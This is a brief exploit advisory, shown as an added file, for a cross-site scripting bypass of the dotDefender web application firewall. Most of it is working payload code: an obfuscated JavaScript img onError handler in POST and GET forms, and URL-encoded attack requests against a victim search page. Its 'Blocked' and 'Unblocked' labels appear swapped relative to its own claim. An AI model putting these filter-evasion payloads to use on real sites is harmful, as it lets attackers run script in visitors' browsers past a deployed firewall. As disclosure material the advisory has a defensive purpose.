@@ -1,0 +1,36 @@
+dotDefender is prone to a XSS because it doesn't satinate the input vars
+correctly. Injecting obfusctated JavaScript code based on references vars
+assignment, the dotDefender WAF is vulnerable.
+
+Class: Input Validation Error
+Remote: Yes
+Credit: David K. (SH4V)
+Vulnerable: till 4.02
+
+Exploit:
+
+<img src="WTF" onError="{var
+{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/
+.source
+)" /> //POST
+
+<img src="WTF" onError="{var
+{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B
+h%2Bn)(
+/0wn3d/.source)" /> //GET
+
+EXAMPLES:
+
+Blocked:
+[victim]/search?q=%3Cimg%20src=%22WTF%22%20onError=%22{var%20{3:s,2:h,5:
+a,0:v,4:n,1:e}
+=%27earltv%27}[self][0][v%2Ba%2Be%2Bs]%28e%2Bs%2Bv%2Bh%2Bn%29%28/0wn3d/.
+source%
+29%22%20/%3E
+
+Unblocked:
+[victim]/search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)
+%20/%3E
+
+More information here:
+http://n3t-datagrams.net/docs/?/=21
